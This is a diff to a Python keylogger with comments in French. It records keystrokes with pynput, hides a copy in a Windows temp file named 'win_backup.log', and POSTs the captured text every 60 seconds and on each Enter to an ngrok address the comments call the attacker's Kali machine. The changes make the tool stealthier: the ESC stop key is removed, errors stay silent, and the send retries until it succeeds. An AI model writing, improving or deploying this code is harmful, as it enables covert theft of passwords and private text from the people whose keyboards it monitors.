@@ -4,14 +4,14 @@ import time
 import threading 
 import os
 import tempfile 
-import sys # Importé pour la furtivité sous Windows
+import sys 
 
 # --- Configuration Distante (VOTRE ADRESSE NGROK) ---
-# Remplacez cette URL par celle que votre KALI Attaquante vous a donnée !
+# Ceci est l'URL de votre Kali Attaquante qui écoute sur le port 5000 via Ngrok.
 NGROK_URL = "http://jeanelle-quintic-lumberingly.ngrok-free.dev" 
 INTERVAL_SECONDS = 60 # Envoi toutes les 60 secondes
 
-# --- Gestion du Chemin de Sauvegarde Windows ---
+# --- Gestion du Chemin de Sauvegarde Windows (Furtivité) ---
 # Utilise le dossier temporaire de Windows pour cacher le fichier de sauvegarde locale.
 LOG_FILE = os.path.join(tempfile.gettempdir(), "win_backup.log") 
 
@@ -19,71 +19,82 @@ LOG_FILE = os.path.join(tempfile.gettempdir(), "win_backup.log")
 log_buffer = ""
 
 def send_log_data(data):
-    """Envoie les données au serveur ngrok et fait une sauvegarde locale."""
+    """
+    Envoie les données au serveur ngrok.
+    Vide le buffer UNIQUEMENT si l'envoi réussit (code 200).
+    Fait toujours une sauvegarde locale.
+    """
     global log_buffer
     
     # Ne fait rien si le buffer est vide
     if not data.strip():
         return 
 
+    # --- Sauvegarde locale de sécurité (Écriture) ---
+    # Cette étape est faite en premier au cas où la connexion échoue
     try:
-        # Tentative d'envoi via POST
+        with open(LOG_FILE, "a") as f:
+            f.write(data)
+    except Exception:
+        pass # Ignore les erreurs d'écriture de fichier
+
+    # --- Tentative d'envoi à Kali ---
+    try:
         response = requests.post(NGROK_URL, data={'log': data})
         
         if response.status_code == 200:
-            # L'envoi a réussi : vide le buffer EN MÉMOIRE (aucune trace visuelle)
+            # SUCCÈS : Vide le buffer pour éviter la répétition du log.
             log_buffer = "" 
-        # Si l'envoi échoue (code != 200), le code passe à la sauvegarde locale
+        # Échec HTTP (code != 200) : ne vide PAS le buffer.
              
     except requests.exceptions.RequestException:
-        # La connexion a échoué (pas de réseau, serveur éteint)
-        pass # Pas de message d'erreur pour rester furtif
-        
-    # --- Sauvegarde locale de sécurité (Écriture) ---
-    with open(LOG_FILE, "a") as f:
-        f.write(data)
+        # Échec de la connexion : ne vide PAS le buffer.
+        pass
 
-# --- Fonction d'Envoi Périodique ---
 def report():
-    """Fonction exécutée toutes les INTERVAL_SECONDS."""
+    """
+    Fonction d'envoi exécutée en parallèle toutes les INTERVAL_SECONDS.
+    Elle est lancée dans un thread séparé.
+    """
     global log_buffer
     
-    # Configure le minuteur pour exécuter report() à nouveau
+    # Configure le minuteur pour exécuter report() à nouveau dans 60 secondes
     threading.Timer(INTERVAL_SECONDS, report).start() 
     
+    # Si le buffer contient des données, on les envoie
     if log_buffer:
         send_log_data(log_buffer)
 
 def on_press(key):
+    """
+    Capture les frappes de clavier, filtre les touches de contrôle et remplit le buffer.
+    """
     global log_buffer
     
-    # --- LA LOGIQUE DE CAPTURE RESTE LA MÊME ---
     try:
+        # Tente d'obtenir le caractère (A, b, 1, $, etc.)
         char = key.char
         log_buffer += char
-    except AttributeError:
         
+    except AttributeError:
+        # Gère les touches spéciales
         if key == pynput.keyboard.Key.space:
             log_buffer += " "
             
         elif key == pynput.keyboard.Key.enter:
             log_buffer += "\n"
-            # On force l'envoi immédiatement sur 'ENTER' (si la connexion est OK)
+            # On force l'envoi immédiatement sur 'ENTER'
             send_log_data(log_buffer) 
 
         elif key == pynput.keyboard.Key.backspace:
+            # Gère le backspace immédiatement dans le buffer
             if len(log_buffer) > 0:
                 log_buffer = log_buffer[:-1]
-                
-        else:
-            # Enregistre le nom de la touche spéciale sans message dans la console
-            log_buffer += f" [{str(key).split('.')[-1].upper()}] "
+            return # Sort immédiatement après backspace
             
-def on_release(key):
-    """Arrête le keylogger uniquement sur la touche ESC (pour les tests)."""
-    # Ce code est généralement retiré pour une utilisation réelle.
-    if key == pynput.keyboard.Key.esc:
-        return False
+        else:
+            # IGNORER : Toutes les touches de contrôle (CTRL, ALT, SHIFT, F1, F2, etc.)
+            return 
 
 # --- Démarrage ---
 
@@ -91,5 +102,6 @@ def on_release(key):
 report() 
 
 # Crée et lance l'écouteur dans le thread principal
-with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+with pynput.keyboard.Listener(on_press=on_press) as listener:
+    # Le keylogger commence à écouter
     listener.join()
